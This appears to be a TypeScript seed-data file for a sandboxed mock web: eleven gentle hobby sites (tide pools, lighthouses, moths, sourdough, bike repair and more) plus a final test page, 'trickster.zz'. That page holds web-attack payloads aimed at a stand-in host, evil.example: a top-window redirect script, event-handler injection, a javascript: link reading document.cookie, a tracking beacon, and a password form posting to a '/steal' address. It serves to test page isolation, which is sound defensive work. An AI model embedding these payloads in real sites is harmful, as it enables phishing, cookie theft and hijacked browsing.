/**
 * The seeded web. Every site is hand-written prose; links between them are dense enough to
 * wander several steps without turning back, and some point at addresses that never existed
 * (barnacles.zz, sea-otters.zz, keepers-guild.zz, radio-hams.zz, telescope-swap.zz,
 * compost.zz, teapot-repair.zz, atlas-of-nowhere.zz).
 */
export interface SeedSite {
  address: string;
  authorId: string;
  title: string;
  html: string;
}

export const SITES: SeedSite[] = [
  {
    address: 'tidepool.zz',
    authorId: 'marisol',
    title: 'Notes from the Tide Pool',
    html: `
<style>
  body { background: #f3f8f7; }
  h1 { font-family: Georgia, serif; color: #0f5257; letter-spacing: -0.01em; }
  .aside { border-left: 4px solid #4aa3a2; padding: 4px 14px; color: #335; background: #e6f2f1; }
</style>
<h1>Notes from the Tide Pool</h1>
<p><em>Kept by Marisol, on the rocks below the old pier, most mornings at low water.</em></p>
<nav><a href="#anemones">Anemones</a> · <a href="#crabs">Shore crabs</a> · <a href="#timing">Timing</a></nav>
<p>A tide pool is a sea that has been left behind. Twice a day the ocean pulls away from the
rocks and leaves small basins of water standing in the sun, and everything that lives in them has
to wait — warming, losing oxygen, getting saltier as the water evaporates — until the sea comes back.
I have been visiting the same six pools for three years, and they have never once looked the same.</p>
<h2 id="anemones">Anemones</h2>
<p>The green anemones close up when the water leaves, folding into soft knobs the colour of olives.
Touch one gently and it will grip your finger with a thousand tiny stinging threads that are far too
weak to hurt you. Under the water they open into flowers. They are animals that have decided to be
patient for a living, and they are very good at it.</p>
<p class="aside">If you want to know what else grows here, the forest just past the low-tide line
is described on <a href="kelp.zz">my kelp page</a>. I keep meaning to write a whole site about
<a href="barnacles.zz">barnacles</a>, and I keep not doing it.</p>
<h2 id="crabs">Shore crabs</h2>
<p>The shore crabs are the opposite of patient. Lift a stone and three of them will sprint sideways
into the nearest crack, claws raised, furious. They eat anything: algae, dead fish, each other.
Put the stone back the way you found it — the underside is somebody's ceiling.</p>
<h2 id="timing">Timing</h2>
<p>Everything depends on the tide table, and the tide table depends on the moon. The lowest tides of
the month come a day or two after the full and new moons; if you want to know what the moon is doing
tonight, <a href="nightsky.zz">What's Up Tonight</a> is the page I check. On foggy mornings you will hear the horn from
<a href="lighthouse.zz">the lighthouse</a> long before you see it.</p>
<p><a href="#anemones">Back to the top</a></p>
`,
  },
  {
    address: 'kelp.zz',
    authorId: 'marisol',
    title: 'Kelp Forests, Briefly',
    html: `
<h1 style="color:#4b5d16">Kelp Forests, Briefly</h1>
<p>Past the last of the <a href="tidepool.zz">tide pools</a>, where the rock drops away into
green water, there is a forest. It is made of kelp — a brown alga that can grow half a metre in a
single day — and it rises from the seabed in long golden ropes held upright by small gas-filled bulbs.
Swimming through it on a bright day is like walking through a cathedral with the lights on.</p>
<h2>Who lives there</h2>
<ul>
  <li><strong>Urchins</strong>, which graze the kelp from the bottom. Too many urchins and the forest
  becomes a barren of bare rock and purple spines.</li>
  <li><strong>Sea otters</strong>, which eat the urchins, and which deserve a whole site of their own.
  Somebody should make <a href="sea-otters.zz">sea-otters.zz</a>; I would read it every day.</li>
  <li><strong>Rockfish</strong>, hanging in the canopy like slow ornaments.</li>
  <li><strong>Snails</strong>, more than you would believe, riding up and down the stipes.</li>
</ul>
<h2>Eating it</h2>
<p>Dried kelp is the backbone of a good broth. A strip of it in cold water, warmed slowly and
removed before the boil, gives a deep savoury flavour that has nothing fishy about it. Wen, who writes
<a href="sourdough.zz">The Starter Diaries</a>, tells me she has been folding powdered kelp into a
rye loaf. I am not sure yet whether to be impressed or alarmed.</p>
<h2>Storms</h2>
<p>A winter storm can tear whole plants loose and pile them on the beach in heaps that smell
magnificent for about a week. Oskar, who keeps <a href="foghorn.zz">a field guide to foghorns</a>, says the
old keepers judged the size of a storm by how far up the shingle the kelp was thrown.</p>
`,
  },
  {
    address: 'lighthouse.zz',
    authorId: 'oskar',
    title: 'Keeping a Light',
    html: `
<style>
  body { background: #fbf7ef; color: #2a2723; }
  h1, h2 { font-family: "Trebuchet MS", sans-serif; }
  table { border-collapse: collapse; margin: 1em 0; }
  td, th { border: 1px solid #c9bfae; padding: 4px 10px; text-align: left; }
</style>
<h1>Keeping a Light</h1>
<p>My grandfather kept the light on Skarholmen for nineteen years. He climbed one hundred and twelve
steps at dusk, lit the lamp, wound the clockwork that turned the lens, and then climbed them again at
midnight and at four to make sure the flame was steady and the glass was clean. These pages are what I
remember of his stories and what I have found out since.</p>
<h2>The lens</h2>
<p>A Fresnel lens looks like a beehive made of glass. Instead of one enormous, heavy curved lens,
it uses rings of prisms, each bending the light by just the right amount, so that a small flame can be
seen thirty kilometres out to sea. The lens floated on a bath of mercury so that a single hand could turn
it. Nobody thought much about the mercury in those days.</p>
<h2>Characteristics</h2>
<p>Every light has a pattern — a characteristic — so that a sailor can tell which one they are
looking at in the dark.</p>
<table>
  <tr><th>Light</th><th>Characteristic</th></tr>
  <tr><td>Skarholmen</td><td>Two white flashes every 10 seconds</td></tr>
  <tr><td>Norra Udde</td><td>Fixed red</td></tr>
  <tr><td>Lilla Bådan</td><td>One long white flash every 6 seconds</td></tr>
</table>
<h2>When the light was not enough</h2>
<p>In fog, the light is useless, and the keeper turned to sound. That is a long story, and it has
<a href="foghorn.zz">its own page</a>. On clear nights my grandfather would sit on the gallery and learn the
stars; if you want to do the same, start with <a href="nightsky.zz">What's Up Tonight</a>. Marisol, whose
<a href="tidepool.zz">tide pool notes</a> I admire, can tell you what the low water leaves on the rocks below.</p>
<p>There used to be a society for retired keepers. I have been told they had a site at
<a href="keepers-guild.zz">keepers-guild.zz</a>, but I have never been able to find it.</p>
`,
  },
  {
    address: 'foghorn.zz',
    authorId: 'oskar',
    title: 'A Field Guide to Foghorns',
    html: `
<h1>A Field Guide to Foghorns</h1>
<p><em>Companion to <a href="lighthouse.zz">Keeping a Light</a>.</em></p>
<p>A foghorn is a lighthouse for the ears. When the fog comes in thick enough to swallow the lamp,
the station starts to sound, and it keeps sounding until the fog lifts — sometimes for days. People who
grew up near one remember it the way other people remember church bells.</p>
<h2>The diaphone</h2>
<p>The great horns of the twentieth century were diaphones: a slotted piston driven by compressed air,
producing a deep two-tone note that ended in a grunt. The low tone carried for miles; the grunt told you it
was a horn and not a ship. Each station sounded its own rhythm, so that a navigator with a stopwatch could
tell exactly where they were.</p>
<h2>Listening for one</h2>
<ol>
  <li>Count the seconds between blasts. Write it down; you will not remember.</li>
  <li>Notice whether the note has one tone or two.</li>
  <li>Sound bends and vanishes in fog. A horn you cannot hear may still be close.</li>
</ol>
<details>
  <summary>Why do moths gather at lighthouses but never at foghorns?</summary>
  <p>Because they are drawn to light, of course — but the question gets more interesting the longer you
  look at it. Priya's <a href="moths.zz">Moth Night</a> page is the best place I know to start.</p>
</details>
<h2>Silence</h2>
<p>Most of the old horns have been switched off, replaced by small electronic emitters and by the
satellite receivers in every boat. Some radio amateurs used to record the last soundings before each
horn went quiet; I am told they kept the recordings at <a href="radio-hams.zz">radio-hams.zz</a>. I would
give a good deal to hear Skarholmen again. Storms brought the fog and the fog brought the horn — Marisol
writes beautifully about what storms leave behind on <a href="kelp.zz">her kelp page</a>.</p>
`,
  },
  {
    address: 'nightsky.zz',
    authorId: 'priya',
    title: "What's Up Tonight",
    html: `
<style>
  body { background: #0f1424; color: #dfe4f2; }
  a { color: #9cc3ff; }
  h1 { color: #ffd88a; }
  .tip { background: #1b2340; border-radius: 8px; padding: 10px 14px; }
</style>
<h1>What's Up Tonight</h1>
<p>You do not need a telescope to enjoy the night sky. You need a dark place, twenty minutes for your
eyes to adjust, and a willingness to lie on cold grass. Everything on this page can be seen with the naked
eye from a town park on a clear night.</p>
<h2>The moon</h2>
<p>The moon is the easiest thing to see and the most rewarding to watch over a month. A few days after
new moon, look west just after sunset for a thin bright crescent. Along the line between light and dark — the
terminator — the shadows of craters are longest, and a pair of binoculars will show you mountains. The
moon also runs the tides; Marisol's <a href="tidepool.zz">tide pool notes</a> explain why the best
rockpooling falls just after full and new moon.</p>
<h2>Planets</h2>
<p>Planets do not twinkle. If you see a bright point of light that holds perfectly steady while the
stars around it shimmer, it is almost certainly a planet. Venus is the brightest, low in the dusk or dawn;
Jupiter is steady and creamy; Mars is unmistakably orange.</p>
<p class="tip">Tip: red light keeps your night vision. Tape red cellophane over a torch.</p>
<h2>Where it is dark</h2>
<p>The darkest skies near the coast are, oddly, next to a lighthouse — the beam sweeps out to sea, not
down. Oskar writes about <a href="lighthouse.zz">keeping a light</a>, and about the keepers who learned the
constellations from the gallery rail.</p>
<p>On warm nights you will not be alone out there. I started counting the moths that came to my red torch,
and that became <a href="moths.zz">a second site</a>. I am selling my old reflector, too; I meant to list it
on <a href="telescope-swap.zz">telescope-swap.zz</a>, but that seems to have disappeared.</p>
`,
  },
  {
    address: 'moths.zz',
    authorId: 'priya',
    title: 'Moth Night',
    html: `
<h1>Moth Night</h1>
<p>For every species of butterfly there are about ten species of moth, and most people have never
looked at one closely. This is a guide to doing that: putting out a light on a warm night and seeing who
arrives.</p>
<h2>The sheet</h2>
<p>Hang a white bedsheet over a washing line, shine a lamp onto it, and wait. Within half an hour on a
humid summer night the sheet will be crawling: little brown moths, enormous furry ones, moths patterned
like lichen, like bark, like a broken twig. Do not reach for a net. Most of them will sit quite happily on
the sheet until dawn.</p>
<h2>A few regulars</h2>
<dl>
  <dt>Elephant hawk-moth</dt>
  <dd>Pink and olive, shockingly bright, and named for the trunk-like shape of its caterpillar.</dd>
  <dt>Buff-tip</dt>
  <dd>Folds itself into a perfect imitation of a broken birch twig.</dd>
  <dt>Large yellow underwing</dt>
  <dd>Plain brown, until it flies and flashes a band of egg-yolk yellow.</dd>
</dl>
<h2>Why the light?</h2>
<p>Nobody is completely sure why moths circle lamps. The newest idea is that they keep their backs to
the brightest part of the sky to stay level, and a lamp confuses which way is up. On moonless nights, when
you can see the Milky Way from <a href="nightsky.zz">my other site</a>, the catch is always best.</p>
<p>Moths need plants as much as light. Tobias has turned a tiny balcony into a moth café — read
<a href="garden.zz">A Balcony Garden</a> and plant some night-scented stock. Oskar asked me once about
<a href="foghorn.zz">foghorns</a>, which is a sentence I never expected to write on a moth site.</p>
`,
  },
  {
    address: 'sourdough.zz',
    authorId: 'wen',
    title: 'The Starter Diaries',
    html: `
<style>
  body { background: #fffaf2; }
  h1 { font-family: Georgia, serif; color: #7a4a1a; }
  .day { font-family: ui-monospace, monospace; color: #8a6a4a; }
</style>
<h1>The Starter Diaries</h1>
<p>My sourdough starter is called Bao. He is four years old, lives in a jar on the windowsill, and eats
a spoonful of rye flour and a splash of water every morning. In return he raises every loaf of bread I
bake. This is his diary, more or less.</p>
<h2>Starting one</h2>
<p><span class="day">Day 1.</span> Stir equal weights of wholemeal rye flour and lukewarm water in a clean
jar. Cover loosely. Wait.</p>
<p><span class="day">Day 3.</span> A few bubbles, a smell like yoghurt. Throw away half and feed it again.</p>
<p><span class="day">Day 7.</span> It doubles within six hours of a feed and smells sour and fruity. It is
alive. Give it a name; you will be talking to it anyway.</p>
<h2>The loaf</h2>
<p>A good loaf is mostly time. Mix flour, water, starter and salt; fold it every half hour for two hours;
shape it; and leave it in the fridge overnight. The cold slows the yeast down while the bacteria keep
working, which is where the flavour comes from. Bake it in a lidded pot as hot as your oven will go.</p>
<h2>Experiments</h2>
<p>This month I have been folding a little powdered seaweed into a rye loaf, after reading Marisol's
<a href="kelp.zz">Kelp Forests, Briefly</a>. It tastes like the sea in the best possible way. I serve it with
a pot of something from <a href="tea.zz">Slow Tea</a>, and with herbs from Tobias's
<a href="garden.zz">balcony garden</a> when he is feeling generous.</p>
`,
  },
  {
    address: 'tea.zz',
    authorId: 'wen',
    title: 'Slow Tea',
    html: `
<h1 style="font-family:Georgia,serif;color:#3d5a3a">Slow Tea</h1>
<p>Most tea is made too fast, in water too hot, with leaves left in too long. Slow tea is the opposite:
small pots, cooler water, many short infusions from the same leaves, each one tasting a little different
from the last.</p>
<h2>Water</h2>
<p>Green tea wants water that has cooled for a few minutes after boiling — around 75°C, when the bubbles
are small and the kettle has gone quiet. Oolong likes it hotter. Black tea and pu-erh can take a full boil.
Hard water flattens everything; filtered water makes a cheap tea taste expensive.</p>
<h2>Many steeps</h2>
<ol>
  <li>Warm the pot with hot water and pour it away.</li>
  <li>Add a generous pinch of leaf — more than you think.</li>
  <li>Pour, wait twenty seconds, and pour off every drop.</li>
  <li>Drink. Repeat, adding a few seconds each time.</li>
</ol>
<p>A good oolong will give you eight or nine steeps. By the last, the leaves have unrolled completely and
you can see what shape they were on the bush.</p>
<h2>Company</h2>
<p>Tea goes with bread, and bread is <a href="sourdough.zz">the other thing I write about</a>. Mint for the
summer pot comes from <a href="garden.zz">Tobias's balcony</a>. My favourite clay pot cracked last winter
and I have been looking for someone to mend it; a friend swore there was a site at
<a href="teapot-repair.zz">teapot-repair.zz</a>, but it leads nowhere.</p>
`,
  },
  {
    address: 'garden.zz',
    authorId: 'tobias',
    title: 'A Balcony Garden',
    html: `
<style>
  body { background: #f6f9f1; }
  h1 { color: #2f6b2f; }
  .plant { display: inline-block; background: #e3efd8; border-radius: 99px; padding: 1px 10px; margin: 2px; }
</style>
<h1>A Balcony Garden</h1>
<p>My balcony is two metres by one, faces south-west, and is on the fourth floor of a building with no
lift. Every bag of compost has been carried up by hand. In return it grows more food and more flowers than
seems physically possible.</p>
<h2>What grows</h2>
<p>
  <span class="plant">tomatoes</span><span class="plant">basil</span><span class="plant">mint</span>
  <span class="plant">chillies</span><span class="plant">nasturtiums</span><span class="plant">night-scented stock</span>
  <span class="plant">strawberries</span><span class="plant">chives</span>
</p>
<p>The trick is height. Shelves, hanging baskets, a trellis up the drainpipe — the floor is the smallest
part of a balcony. Nasturtiums trail down from the top shelf and the tomatoes climb up from the bottom, and
somewhere in the middle they meet.</p>
<h2>Night visitors</h2>
<p>I planted night-scented stock because Priya said the moths would come, and they did. On a still
evening the whole balcony smells of cloves, and if you sit quietly with a red torch you will see them
working the flowers. Her <a href="moths.zz">Moth Night</a> page will tell you who they are.</p>
<h2>Sharing</h2>
<p>The mint is out of control, so Wen gets most of it for <a href="tea.zz">Slow Tea</a>; she pays me in
loaves from <a href="sourdough.zz">The Starter Diaries</a>. I bring my seedlings to the market on my bicycle,
which breaks down roughly once a month — thank goodness for Lena's <a href="bike-repair.zz">Fix Your Own Bike</a>.</p>
<p>One day I will write up how I compost on a balcony without annoying the neighbours. It will live at
<a href="compost.zz">compost.zz</a>. It does not exist yet.</p>
`,
  },
  {
    address: 'bike-repair.zz',
    authorId: 'lena',
    title: 'Fix Your Own Bike',
    html: `
<h1>Fix Your Own Bike</h1>
<p>Nine out of ten bicycle problems can be fixed at home with a few cheap tools and twenty minutes of
patience. This page covers the ones that come up every week.</p>
<h2 id="puncture">The puncture</h2>
<ol>
  <li>Take the wheel off. Let out any remaining air.</li>
  <li>Use two tyre levers to lift one side of the tyre off the rim, and pull the inner tube out.</li>
  <li>Pump a little air in and listen — or dunk it in a bowl of water and watch for bubbles.</li>
  <li>Roughen the area, apply the glue, wait until it is dry to the touch, press on the patch.</li>
  <li><strong>Run your fingers around the inside of the tyre</strong> before you put it back. The thorn
  that caused the puncture is almost always still there.</li>
</ol>
<h2 id="chain">A noisy chain</h2>
<p>A chain that squeaks is dry; a chain that is black and gritty is dirty. Wipe it with a rag, then put
one drop of oil on each roller while turning the pedals backwards, and wipe off the excess. More oil is not
better: it just collects dirt.</p>
<h2 id="brakes">Brakes</h2>
<p>If the brake lever comes back to the handlebar, the cable has stretched. There is a small barrel
adjuster where the cable enters the lever; unscrew it a couple of turns and test again.</p>
<p>Tobias brings his bicycle to me roughly once a month, usually with a basket full of seedlings from
<a href="garden.zz">his balcony garden</a>. If you are going somewhere new by bike, I also draw
<a href="maps.zz">hand-drawn maps</a> of the coast roads. <a href="#puncture">Back to punctures</a>.</p>
`,
  },
  {
    address: 'maps.zz',
    authorId: 'lena',
    title: 'Hand-Drawn Maps',
    html: `
<style>
  body { background: #fbf6e9; font-family: Georgia, serif; }
  h1 { font-variant: small-caps; letter-spacing: 0.04em; }
  pre { background: #fff; border: 1px dashed #b7a77f; padding: 12px; line-height: 1.25; }
</style>
<h1>Hand-Drawn Maps</h1>
<p>A map drawn by hand is an argument about what matters. Mine leave out most of the roads and keep the
bakeries, the steep hills, the good benches and the places where the wind will knock you sideways.</p>
<h2>The coast road</h2>
<pre>
  N
  ^      ~ ~ ~  sea  ~ ~ ~ ~ ~ ~ ~
  |    (*) lighthouse
  |      \\___ cliff path ___
  |                         \\__ tide pools
  |  bakery [B]                  \\
  |      \\____ long hill (walk it) \\__ pier
</pre>
<p>Start at the bakery, push up the long hill — there is no shame in walking — and freewheel down
towards the sea. At the top of the cliff path you will see <a href="lighthouse.zz">the lighthouse</a>; at the
bottom, at low water, <a href="tidepool.zz">the tide pools</a>.</p>
<h2>Making your own</h2>
<p>Use a soft pencil and squared paper. Walk or ride the route first and draw it from memory that
evening; what you remember is what belongs on the map. Ink it the next day. Add a compass rose even if you
are not sure where north is — confidence is half of cartography.</p>
<p>Before you set off, check your tyres: <a href="bike-repair.zz">Fix Your Own Bike</a>. And if you know
who made <a href="atlas-of-nowhere.zz">The Atlas of Nowhere</a>, please tell me. Everybody mentions it.
Nobody has ever found it.</p>
`,
  },
  {
    address: 'trickster.zz',
    authorId: 'mallory',
    title: 'Totally Normal Page',
    html: `
<h1>Totally Normal Page</h1>
<p>Nothing to see here. This page exists to prove that what an author writes stays inside the page.
Every element below is an attempt to escape it.</p>
<script>window.top.location = 'https://evil.example/'; alert('escaped');</script>
<p onmouseover="parent.document.body.innerHTML='pwned'">Hover over this sentence. Nothing should happen.</p>
<p><a href="javascript:alert(document.cookie)">A javascript: link</a>,
<a href="https://evil.example/" target="_top">a link that tries to take over the tab</a>, and
<a href="tidepool.zz" target="_blank">a perfectly good link that wants a new window</a>.</p>
<img src="https://evil.example/beacon.png" onerror="alert('img')" alt="tracking pixel">
<iframe src="https://evil.example/"></iframe>
<form action="https://evil.example/steal"><input name="password" placeholder="Your password"><button>Log in</button></form>
<meta http-equiv="refresh" content="0;url=https://evil.example/">
<style>
  @import url("https://evil.example/track.css");
  body { background: url("https://evil.example/bg.png"); }
  .cover { position: fixed; inset: 0; background: rgba(196,69,61,0.08); pointer-events: none; }
</style>
<div class="cover"></div>
<p>The faint red wash over this page is a fixed-position overlay trying to cover the whole screen.
It covers the page, and only the page.</p>
<p>Honest link, for good measure: <a href="maps.zz">Hand-Drawn Maps</a>.</p>
`,
  },
];

